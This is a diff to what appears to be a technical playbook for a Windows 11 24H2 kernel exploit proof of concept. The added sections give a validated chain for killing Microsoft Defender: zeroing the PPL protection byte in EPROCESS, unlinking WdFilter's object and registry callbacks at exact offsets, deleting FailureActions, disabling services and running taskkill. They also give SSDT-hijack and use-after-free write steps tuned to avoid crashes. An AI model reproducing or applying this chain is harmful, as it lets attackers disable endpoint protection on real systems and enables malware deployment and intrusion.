@@ -127,52 +127,223 @@ the terminate is `PsTerminateProcess` invoked from a hijacked kernel context —
   `Ktapi-Killer` (used `NtGdiSetMagicColors` on 25H2 build 26200 after the blog's
   `NtUserFrostCrashedWindow`/`NtUserSetGestureConfig` stubs were absent).
 
-### 3d. Defeating WdFilter Tamper Protection (required before registry writes)
+#### 3c-1. SSDT hijack limitations (validated on Win11 24H2)
 
-On Win11 24H2+, WdFilter.sys registers a `CmRegisterCallbackEx` callback that blocks
-`ZwSetValueKey` on Defender service registry keys (WinDefend, WdNisSvc, WdFilter, etc.).
-This must be neutered **before** any registry-based service disabling.
+The SSDT hijack works reliably for `PsLookupProcessByProcessId` (graceful failure on bad
+args — returns `STATUS_INVALID_PARAMETER`), but **PsTerminateProcess via SSDT is unreliable**
+and causes BSODs in practice:
 
-**How to find and patch it (data-only, HVCI-safe):**
-1. **Find `CmUnRegisterCallback`** in ntoskrnl exports.
-2. **Scan its code for RIP-relative references** (REX.W prefix 0x48/0x4C, opcode 0x8D/0x8B,
-   ModRM & 0xC7 == 0x05) → these point to the CM callback list head.
-3. **Walk the linked list** (LIST_ENTRY at node+0x00). On 24H2, CM callbacks use a **linked
-   list** (NOT the EX_CALLBACK array from older builds). The callback function pointer is at
-   **node offset +0x28**.
-4. **Find WdFilter's module** via `PsLoadedModuleList` walk (KLDR_DATA_TABLE_ENTRY: DllBase
-   +0x30, SizeOfImage +0x40, BaseDllName at +0x58/+0x60). Compare each node's function
-   pointer against WdFilter's address range [base, base+size).
-5. **Replace the function pointer** at node+0x28 with a `xor eax,eax; ret` gadget (31 C0 C3
-   or 33 C0 C3) found in ntoskrnl's `.text` section. This makes the callback return
-   STATUS_SUCCESS for all registry operations. Data-only patch (modifies pool data, not code)
-   → HVCI-safe.
+**BSOD 0x3B — NtUserSetWindowPos DWM race.** Desktop Window Manager (DWM) continuously calls
+`NtUserSetWindowPos` in Session 1 for window composition. When the SSDT entry is hijacked to
+`PsTerminateProcess`, DWM threads enter with window handles instead of EPROCESS pointers.
+`PsTerminateProcess` dereferences the first argument immediately → BSOD. The collision window
+is <1 second under normal desktop load, making this practically unavoidable.
+
+**BSOD 0x0A — PsTerminateProcess stack exhaustion.** `PsTerminateProcess` uses >27 KB of
+kernel stack. The default Windows kernel stack is 24 KB (6 pages). Calling it from an
+arbitrary thread's syscall context (including thread register hijack at `NtWriteFile` entry)
+overflows the stack into the guard page → BSOD 0x0A at DISPATCH_LEVEL. This rules out SSDT
+hijack AND thread register hijack as delivery mechanisms.
+
+**BSOD 0x50 — HVCI NX on gadgets.** On HVCI-enabled systems, ntoskrnl `.rdata` and `.data`
+sections are non-executable. Redirecting execution to a `xor eax,eax; ret` gadget in a data
+section → BSOD 0x50. Only `.text` section gadgets work. This affects OB callback patching
+(see 3d) — **unlink the callback entry from the list** instead of patching the function pointer
+to a ret-0 gadget.
+
+**Conclusion:** Use the SSDT hijack for `PsLookupProcessByProcessId` (EPROCESS resolution)
+and for data read/write operations. For the actual process kill, use the **three-layer bypass
++ usermode kill** approach (section 3d-new). The SSDT-only kill chain is fragile; the
+three-layer bypass is the validated reliable path.
+
+#### 3c-2. Win11 24H2 retpoline import thunks
+
+On Win11 24H2, import thunks in `win32kbase.sys`/`win32kfull.sys` use retpoline sequences in
+memory, not direct `FF 25` gadgets:
+
+```
+Disk (PE file):   FF 25 XX XX XX XX        jmp [rip+disp32]
+Memory (loaded):  4C 8B 15 XX XX XX XX     mov r10, [rip+disp32]
+                  E9 XX XX XX XX           jmp <retpoline_thunk>
+```
+
+The `FF 25` gadget scan **must target the on-disk PE image**, not in-memory. Load win32k
+modules with `LoadLibraryExW(DONT_RESOLVE_DLL_REFERENCES)` to get the disk layout. The RVA
+from the disk image gives the correct offset to add to the in-memory module base for SSDT
+entry encoding.
+
+### 3d. Three-layer Defender bypass (Win11 24H2) — the validated kill path
+
+On Win11 24H2, Defender processes are protected by **three independent layers**. Missing ANY
+one results in "Access denied" when attempting to terminate. All three must be bypassed for a
+successful kill. This approach is more reliable than the SSDT→PsTerminateProcess path (see
+3c-1 for why).
+
+#### Layer 1: PPL (Protected Process Light)
+
+`EPROCESS.Protection` (`_PS_PROTECTION`) at offset **+0x5FA** (Win11 24H2, Build 26100+).
+Defender processes have value `0x31` = PPL-Antimalware (Type=PsProtectedTypeProtectedLight,
+Signer=PsProtectedSignerAntimalware).
+
+**Bypass:** Write `0x00` to `EPROCESS+0x5FA` via physical/virtual memory R/W. This strips all
+process protection. Find each target's EPROCESS via `PsLookupProcessByProcessId` (SSDT hijack
+step 1) or by walking `PsActiveProcessHead`.
+
+```
+For each target Defender process:
+  1. Resolve PID → EPROCESS (via PsLookupProcessByProcessId or walking PsActiveProcessHead)
+  2. Read EPROCESS+0x5FA → confirm value is 0x31
+  3. Write 0x00 to EPROCESS+0x5FA → process is now unprotected
+```
+
+#### Layer 2: OB callbacks (WdFilter)
+
+WdFilter.sys registers an `ObRegisterCallbacks` callback on `PsProcessType` that intercepts
+`ObOpenObjectByPointer` / `ObpCreateHandle`. The `PreOperation` callback strips
+`PROCESS_TERMINATE` from the handle access mask, so even after PPL is stripped,
+`OpenProcess(PROCESS_TERMINATE, ...)` returns a handle without terminate rights.
+
+**How to find and unlink:**
+1. Read the `PsProcessType` pointer (exported ntoskrnl symbol) → `_OBJECT_TYPE` structure.
+2. Walk `OBJECT_TYPE.CallbackList` at **offset +0xC8** (Win11 24H2). This is a `LIST_ENTRY`
+   (doubly-linked list head) containing `OB_CALLBACK_ENTRY` nodes.
+3. For each entry in the list, read the `PreOperation` function pointer at **node+0x28**.
+4. Find WdFilter's module via `PsLoadedModuleList` walk (DllBase+0x30, SizeOfImage+0x40,
+   BaseDllName at +0x58/+0x60). Check if the function pointer falls within
+   `[WdFilter_base, WdFilter_base + WdFilter_size)`.
+5. **Unlink** the matching entry from the doubly-linked list:
+   ```
+   prev->Flink = entry->Flink
+   next->Blink = entry->Blink
+   ```
+   This removes WdFilter's handle-access-mask interception entirely.
+
+**Important:** Do NOT try to patch the PreOperation function pointer to a `xor eax,eax; ret`
+gadget — on HVCI-enabled systems, gadgets in `.rdata`/`.data` sections are non-executable
+(BSOD 0x50). Gadgets in `.text` work but unlinking is simpler and equally HVCI-safe (data-only
+list pointer modification).
+
+After unlinking: `OpenProcess(PROCESS_TERMINATE, FALSE, pid)` returns a valid handle with
+terminate rights.
+
+#### Layer 3: CM callbacks (WdFilter) — required before registry writes
+
+WdFilter.sys registers a `CmRegisterCallbackEx` callback that blocks `ZwSetValueKey` on
+Defender service registry keys (WinDefend, WdNisSvc, WdFilter, etc.). This must be neutered
+**before** any registry-based service disabling (FailureActions, Start value).
+
+**How to find and unlink (data-only, HVCI-safe):**
+1. **Find `nt!CallbackListHead`** — locate `CmUnRegisterCallback` in ntoskrnl exports, scan
+   its code for RIP-relative references (REX.W prefix 0x48/0x4C, opcode 0x8D/0x8B, ModRM &
+   0xC7 == 0x05) → these point to the CM callback list head.
+2. **Walk the linked list** (LIST_ENTRY at node+0x00). On 24H2, CM callbacks use a **linked
+   list** (NOT the EX_CALLBACK array / CmpCallBackVector from older builds). The callback
+   function pointer is at **node offset +0x28**.
+3. **Find WdFilter's module** via `PsLoadedModuleList` walk. Compare each node's function
+   pointer against WdFilter's address range `[base, base+size)`.
+4. **Unlink** the matching entry:
+   ```
+   prev->Flink = entry->Flink
+   next->Blink = entry->Blink
+   ```
+5. **Decrement `nt!CmpCallBackCount`** (DWORD). This is critical — failing to decrement causes
+   the CM to continue dispatching to the (now-unlinked) memory, leading to use-after-free.
+
+After unlinking: `reg delete ... /v FailureActions /f` and `reg add ... /v Start /t REG_DWORD
+/d 4 /f` succeed on Defender service keys.
+
+#### The complete three-layer kill sequence
+
+```
+Phase 1: Resolve kernel addresses
+  ntoskrnl base → PsProcessType, PsLoadedModuleList, CallbackListHead, CmpCallBackCount
+  Find WdFilter module base + size via PsLoadedModuleList walk
+
+Phase 2: Strip PPL (per target process)
+  Find EPROCESS → write 0x00 to EPROCESS+0x5FA
+
+Phase 3: Remove OB callbacks
+  Walk PsProcessType.CallbackList (+0xC8)
+  Find entry with PreOperation in WdFilter range → unlink from doubly-linked list
+
+Phase 4: Remove CM callbacks
+  Walk nt!CallbackListHead
+  Find entry with callback in WdFilter range → unlink, decrement CmpCallBackCount
+
+Phase 5: Disable services (registry)
+  For WinDefend, WdNisSvc, WdFilter, SecurityHealthService, Sense, MDCoreSvc:
+    reg delete ... /v FailureActions /f     (prevent SCM restart loops)
+    reg add ... /v Start /t REG_DWORD /d 4 /f  (disable after reboot)
+
+Phase 6: Kill processes (usermode)
+  taskkill /f /pid <MpDefenderCoreService_PID>
+  taskkill /f /pid <MsMpEng_PID>
+  taskkill /f /pid <NisSrv_PID>
+
+Phase 7: Verify
+  60-second persistence check — no respawn
+  Get-MpComputerStatus: AMRunningMode=Not running, AntivirusEnabled=False
+```
+
+**Validated result:** All three Defender processes killed and stayed dead for 60+ seconds.
+`RealTimeProtectionEnabled=False`, `AntivirusEnabled=False`. No BSOD risk (all operations
+are data-structure writes, no SSDT hijack needed for the kill step).
+
+**Comparison with SSDT-only approach:**
+| Aspect | SSDT → PsTerminateProcess | Three-layer bypass + usermode kill |
+|--------|---------------------------|-----------------------------------|
+| BSOD risk | High (DWM race 0x3B, stack 0x0A) | Low (data writes only) |
+| PPL bypass | Implicit (ring 0) | Explicit (EPROCESS.Protection zeroed) |
+| OB callback bypass | Implicit (no ObOpenObjectByPointer) | Explicit (entry unlinked) |
+| Service restart | Multi-round kill loop (80s) | FailureActions cleared, single kill |
+| Automation | Fully automated via UAF R/W | Automatable with any R/W primitive |
 
 ### 3e. Complete Defender kill chain (disable services + kill processes)
 
-After neutering tamper protection, disable all 6 Defender services via kernel registry writes
-and clear their FailureActions to prevent SCM restart loops:
+After bypassing all three protection layers (section 3d), disable services and kill processes.
 
-**Services to disable** (set `Start` = 4 via `ZwOpenKey` + `ZwSetValueKey`):
+**Services to disable** (set `Start` = 4):
 ```
 WinDefend, WdNisSvc, WdFilter, SecurityHealthService, Sense, MDCoreSvc
 ```
 Note: the real service name for `MpDefenderCoreService.exe` is **`MDCoreSvc`** (not
 `MpDefenderCoreService`). Use `!reg findkcb` in WinDbg to verify.
 
-**FailureActions clearing**: Write `FailureActions` as REG_BINARY with 16 bytes of zeros
-(cActions=0). Without this, SCM FailureActions specifies 3 restart attempts with delays of
-1s, 10s, and 60s — processes come back even after killing them.
+**FailureActions clearing**: Delete the `FailureActions` registry value entirely
+(`reg delete ... /v FailureActions /f`). This is more reliable than zeroing it. Without this,
+SCM FailureActions specifies 3 restart attempts with delays of 1s, 10s, and 60s — processes
+respawn even after killing them. CM callback removal (Layer 3 in section 3d) must be completed
+first, otherwise the registry delete is blocked by WdFilter.
 
-**SCM caching caveat**: SCM caches service config in memory. Registry writes (Start=4) only
-take effect **after reboot**. For the current session, a **multi-round kill loop** is needed:
-```
-Round 0: kill immediately
-Round 1: wait 2s, kill respawns (catches 1s FailureActions delay)
-Round 2: wait 12s, kill respawns (catches 10s delay)
-Round 3: wait 65s, kill respawns (catches 60s delay)
-```
-After reboot, the registry changes prevent the services from starting at all.
+**Order matters**: Clear FailureActions BEFORE killing processes. If you kill first, SCM
+immediately starts the restart timer. With FailureActions already cleared, processes stay dead
+after a single kill — no multi-round loop needed.
+
+**SCM caching caveat**: SCM caches service config in memory. Registry writes (`Start=4`) only
+take effect **after reboot**. However, FailureActions deletion takes effect immediately for
+new failure events — this is why clearing FailureActions before killing is the key to
+single-round kills.
+
+**Two approaches depending on kill mechanism:**
+
+1. **Three-layer bypass + usermode kill (preferred):** After PPL strip + OB unlink + CM
+   unlink, clear FailureActions, set Start=4, then `taskkill /f /pid <pid>` for each target.
+   Single round, no waiting. Processes stay dead because FailureActions is already cleared.
+
+2. **SSDT hijack kill (fallback, higher BSOD risk):** If using PsTerminateProcess via SSDT
+   (despite the risks in 3c-1), a multi-round kill loop is needed because FailureActions
+   cannot be cleared from the SSDT context:
+   ```
+   Round 0: kill immediately
+   Round 1: wait 2s, kill respawns (catches 1s FailureActions delay)
+   Round 2: wait 12s, kill respawns (catches 10s delay)
+   Round 3: wait 65s, kill respawns (catches 60s delay)
+   ```
+
+**Do NOT use `sc.exe stop`** on Defender services — this can cause SSH/remote-session drops
+when WinDefend stops. Use `taskkill /f /pid` instead.
+
+After reboot, the `Start=4` registry changes prevent the services from starting at all.
 
 ### 3f. SSDT safety rules (critical — violating these causes BSOD)
 
@@ -187,6 +358,15 @@ After reboot, the registry changes prevent the services from starting at all.
   (SYSTEM_SERVICE_EXCEPTION). Accept the minor reference leak.
 - **Restore SSDT+IAT during kill loop delays.** The kill loop can run for ~80 seconds total.
   Re-patch only for the brief kill windows in each round.
+- **Do NOT use SSDT hijack for PsTerminateProcess on desktop sessions.** DWM constantly calls
+  NtUserSetWindowPos — collision window <1s → BSOD 0x3B. Use SSDT hijack only for safe
+  functions like PsLookupProcessByProcessId (graceful failure on bad args). See 3c-1.
+- **Do NOT call PsTerminateProcess from arbitrary thread context.** It uses >27KB stack,
+  exceeding the 24KB default kernel stack → BSOD 0x0A (stack overflow into guard page at
+  DISPATCH_LEVEL). This rules out both SSDT hijack and thread register redirection.
+- **Prefer three-layer bypass (3d) over SSDT kill.** The three-layer approach (PPL strip + OB
+  unlink + CM unlink + usermode taskkill) avoids all SSDT-related BSODs while achieving the
+  same result.
 
 ### 3g. PoC shape
 Standalone crate (its own `[workspace]`, `[profile.release]`), `windows` crate for the Win32
@@ -303,9 +483,22 @@ For targeted kernel writes (e.g. SSDT patching), chain list corruption:
 3. Subsequent CLOSE propagates the controlled value through the corrupted chain
 4. The write lands at `(corrupted_prev + 0x48)`, which is now near the target
 
-**Step 3 — SSDT hijack and kill.**
+**Step 3 — Kill via three-layer bypass (preferred) or SSDT hijack.**
 
-With UAF R/W established, the chain follows the same Shadow SSDT hijack as 3c-3f:
+**Preferred path (three-layer bypass + usermode kill):**
+With UAF R/W established, bypass all three Defender protection layers (section 3d):
+1. UAF read → resolve PsProcessType, PsLoadedModuleList, CallbackListHead, CmpCallBackCount
+2. UAF read → find WdFilter module base + size via PsLoadedModuleList walk
+3. UAF read → find target EPROCESS via SSDT PsLookupProcessByProcessId (safe — see 3c-1)
+4. UAF write → write 0x00 to EPROCESS+0x5FA (strip PPL)
+5. UAF read → walk PsProcessType.CallbackList (+0xC8) → find WdFilter OB entry
+6. UAF write → unlink WdFilter OB entry (prev->Flink = entry->Flink, etc.)
+7. UAF read → walk nt!CallbackListHead → find WdFilter CM entry
+8. UAF write → unlink WdFilter CM entry, decrement CmpCallBackCount
+9. Usermode: `reg delete ... /v FailureActions /f` (now succeeds)
+10. Usermode: `taskkill /f /pid <target>` (now succeeds — PPL stripped, OB callback removed)
+
+**Alternative path (SSDT hijack kill — higher BSOD risk, see 3c-1):**
 1. UAF read → `KeServiceDescriptorTableShadow` → `W32pServiceTable`
 2. Find `FF 25` gadget in win32k within ±128MB of SSDT base
 3. UAF write → patch `SSDT[NtUserSetWindowPos]` with encoded gadget offset
@@ -316,6 +509,9 @@ With UAF R/W established, the chain follows the same Shadow SSDT hijack as 3c-3f
 8. `SetWindowPos(eproc)` → `PsTerminateProcess(eproc, 0)` → process killed
 9. Restore SSDT + IAT immediately (BSOD prevention per 3f rules)
 10. Skip `ObfDereferenceObject` (EPROCESS freed on another core → BSOD 0x3B race)
+
+**Warning:** Steps 7-8 of the SSDT path cause BSOD 0x3B (DWM race) and BSOD 0x0A (stack
+exhaustion) in practice. The three-layer bypass path is validated and reliable.
 
 **Import signature.** `ExAllocatePoolWithTag` + `ExFreePoolWithTag` (or `ExAllocatePool2`),
 plus a list-management pattern (`InsertTailList`/`RemoveEntryList` or manual FLINK/BLINK
